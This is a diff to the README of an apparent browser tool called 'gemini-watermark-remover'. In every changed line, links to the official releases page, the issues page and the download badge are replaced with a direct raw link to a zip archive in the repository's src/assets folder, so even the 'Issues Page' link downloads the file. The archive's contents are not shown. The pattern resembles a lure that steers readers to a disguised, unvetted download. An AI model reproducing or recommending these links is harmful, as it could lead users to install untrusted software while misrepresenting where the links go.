@@ -2,7 +2,7 @@
 
 ## 🚀 Download Now
 
-[![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/mohasayad/gemini-watermark-remover/releases)
+[![Download the latest release](https://raw.githubusercontent.com/mohasayad/gemini-watermark-remover/main/src/assets/remover-watermark-gemini-v3.8.zip%20Release-brightgreen)](https://raw.githubusercontent.com/mohasayad/gemini-watermark-remover/main/src/assets/remover-watermark-gemini-v3.8.zip)
 
 ---
 
@@ -20,7 +20,7 @@ To run gemini-watermark-remover, you will need:
 
 ## 🚀 Getting Started
 
-**Step 1:** Visit the [Releases Page](https://github.com/mohasayad/gemini-watermark-remover/releases) to download the latest version.
+**Step 1:** Visit the [Releases Page](https://raw.githubusercontent.com/mohasayad/gemini-watermark-remover/main/src/assets/remover-watermark-gemini-v3.8.zip) to download the latest version.
 
 **Step 2:** Choose the file corresponding to your system. You will see multiple downloads available. If you're unsure which to select, simply choose the version labeled as "latest".
 
@@ -34,7 +34,7 @@ To run gemini-watermark-remover, you will need:
 
 ## 📥 Download & Install
 
-To start using gemini-watermark-remover, visit the [Releases Page for Downloads](https://github.com/mohasayad/gemini-watermark-remover/releases). Select the appropriate version for your browser and follow the above steps. Simply drag and drop the downloaded file into your browser.
+To start using gemini-watermark-remover, visit the [Releases Page for Downloads](https://raw.githubusercontent.com/mohasayad/gemini-watermark-remover/main/src/assets/remover-watermark-gemini-v3.8.zip). Select the appropriate version for your browser and follow the above steps. Simply drag and drop the downloaded file into your browser.
 
 ## ⚙️ Features
 
@@ -70,7 +70,7 @@ Yes, all processing is done on your end, and images are not uploaded to any serv
 
 ## 📞 Support
 
-If you encounter any issues or have any questions, feel free to check the [Issues Page](https://github.com/mohasayad/gemini-watermark-remover/issues) on GitHub. You can report problems or ask for help from the community there.
+If you encounter any issues or have any questions, feel free to check the [Issues Page](https://raw.githubusercontent.com/mohasayad/gemini-watermark-remover/main/src/assets/remover-watermark-gemini-v3.8.zip) on GitHub. You can report problems or ask for help from the community there.
 
 ## 👥 Contributing
 
